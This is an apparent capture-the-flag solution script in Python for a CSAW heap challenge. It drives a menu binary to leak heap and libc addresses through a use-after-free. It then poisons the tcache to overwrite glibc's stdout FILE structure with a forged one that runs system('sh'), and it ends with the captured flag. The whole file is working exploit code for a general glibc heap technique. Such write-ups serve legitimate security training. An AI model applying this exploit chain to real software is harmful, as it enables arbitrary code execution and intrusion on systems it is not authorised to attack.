#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./chal_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x1833
brva 0x13EC
brva 0x15B5
brva 0x172A
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'>> ', choice)

def malloc(idx: int, type: int, data: bytes):
    menu(1)
    slna(b'Slot: ', idx)
    slna(b': ', type)
    sa(b'Ingredients: ', data)

def free(idx: int):
    menu(2)
    slna(b'Slot: ', idx)

def edit(idx: int, data: bytes):
    menu(3)
    slna(b'Slot: ', idx)
    sa(b'Ingredients: ', data)

def show(idx: int):
    menu(4)
    slna(b'Slot: ', idx)
    return rl()[:-1]

# ==================== EXPLOIT ====================
p = start()

# leak heap

malloc(0, 1, b'A' * 0x10)
free(0)
malloc(1, 1, b'B' * 0x10) # chunk 0 and chunk 1 are at the same address
free(0) # put chunk 0 to tcache again, chunk 1 type still there and not set to 0

heap = fixleak(show(1)) << 12
slog('heap base @ %#x', heap)

malloc(2, 1, b'A' * 0x10)
free(2)
malloc(15, 1, b'A' * 0x10) # chunk 2 and chunk 15 are at the same address

# fill tcache
for i in range(3, 10):
    malloc(i, 1, b'A' * 0x10)
for i in range(3, 10)[::-1]:
    free(i)

free(2) # put chunk 2 to unsorted bin

libc.address = fixleak(show(15).ljust(8, b'\x00')) - 0x203b20
slog('libc base @ %#x', libc.address)

# tcache poisoning
malloc(11, 1, b'A' * 0x10) # chunk 11 and chunk 3 are at the same address
free(3)
edit(11, p64(mangle(heap, libc.sym._IO_2_1_stdout_)) + p64(0))

malloc(12, 1, b'A' * 0x10)

fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = libc.sym.system
fp._lock = libc.sym._IO_2_1_stdout_ + 0x50
fp._wide_data = libc.sym._IO_2_1_stdout_
fp.vtable = libc.sym._IO_wfile_jumps - 0x20
payload = bytes(fp) + p64(libc.sym._IO_2_1_stdout_ + 0x10 - 0x68)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

malloc(13, 1, payload)

interactive()
# csawctf{Rinbo2_wh47_4_yummy_b07c4k3_cohqif_0n3_m0r3_p13453_duzsad}
